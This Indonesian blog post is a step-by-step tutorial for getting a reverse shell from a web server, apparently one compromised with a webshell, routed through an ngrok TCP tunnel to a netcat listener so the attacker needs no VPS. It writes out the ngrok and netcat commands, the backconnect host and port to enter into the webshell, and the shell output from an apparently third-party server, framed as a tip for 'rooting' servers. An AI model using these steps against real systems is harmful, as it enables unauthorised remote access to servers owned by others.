---
title: "Backconnect Server With Ngrok"
author: "TanMyID"
tags: ["Network", "Web", "Pentest"]
date: 2019-05-03T08:46:38+07:00
draft: false
---

Bagi temen temen yang mau rooting server tapi tidak punya VPS, ada cara lain yaitu dengan menggunakan ngrok, tapi tidak semua server atau *web shell* support backconnect dengan ngrok. tidak ada salahnya mencoba kan? hehe.

Disini saya menggunakan perl sebagai media backconnect antara server dan ngrok. OK lanjut ke alat tempurnya.

 1. Ngrok [Download](https://ngrok.com/download) Pilih sesuai sitem operasi kamu.
 2. Server yang support perl sangat di anjurkan,
 3. Netcat [Download](https://eternallybored.org/misc/netcat/) (disini saya menggunakan windows)

### Download dan Auth Ngrok
Jangan lupa untuk buat akun ngrok di [sini](https://dashboard.ngrok.com/user/signup) guna mengautentikasi token. Ektrak ngrok-XXX.zip nya lalu autentikasi token nya agar *ngrok* dapat berjalan. Ganti token sesuai dengan punyamu.
```
./ngrok authtoken initokenBqHnhg3_3X3JtBTSu1rNojz4kXXX
```

### Konfigurasi Ngrok & Netcat 
Selanjutnya jalankan *ngrok* dengan tcp, port sesuai selera misalkan:
```
./ngrok.exe tcp 1991
```
Pastikan ngrok berjalan dengan baik seperti di bawah ini,
```
ngrok by @inconshreveable                                                       (Ctrl+C to quit)

Session Status                online
Account                       Tan (Plan: Free)
Version                       2.3.23
Region                        United States (us)
Web Interface                 http://127.0.0.1:4040
Forwarding                    tcp://0.tcp.ngrok.io:16857 -> localhost:1991

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
```
Jalankan netcat, pastikan port sesuai dengan port yang di jalankan di ngrok.
```
./nc.exe -lnvp 1991
```
Pastikan netcat berjalan walau masih listening,
```
λ .\nc.exe -lnvp 1991
listening on [any] 1991 ...
```

### Backconnect Server
Setelah semua terkonfigurasi, tinggal melakukan backconnect server ke komputer kita, pastikan webshell yang kita gunakan mempunyai fitur *backconnect*. 
{{< figure src="https://raw.githubusercontent.com/tanmyid/blog/master/img/fitur-bc.PNG" alt="fitur-bc" caption="Fitur Backconnect" >}}

Setelah semua terkonfigurasi, isi server dengan `0.tcp.ngrok.io` dan isi Port dengan port yang di buat oleh ngrok misal `16857` di sini saya menggunakan perl. Untuk `Bind port to /bin/sh [Perl]` abaikan saja. Klik >>
{{< figure src="https://res.cloudinary.com/tanmyid/image/upload/v1556851179/isi-bc_kodyu6.png" alt="isi-bc" caption="Contoh backconect" >}}

Cek di netcat, apakah sukses melalukan backconnect, jika sudah balasan dari server seperti di bawah, berarti sudah sukses backconnet,
```
λ .\nc.exe -lnvp 1991
listening on [any] 1991 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 62032
sh: no job control in this shell
sh-4.2$
```
### Uji Coba Command Linux
Selanjutnya tinggal [Spawn TTY Shell](https://tan.my.id/posts/spawn-tty-shell/). Ok kita coba jalankan command untuk memastikan kita sudah benar benar mendapak shell nya.
```
sh-4.2$ uname -a                                                                                
uname -a                                                                                        
Linux thewhitecloud.in 3.10.0-514.16.1.el7.x86_64 #1 SMP Wed Apr 12 15:04:24 UTC 2017 x86_64 x86
_64 x86_64 GNU/Linux                                                                            
```
Ok sudah berhasil, tips ini berguna bagi kalian yang tidak mempunyai VPS saat rooting server. Sekian dan terima kasih.
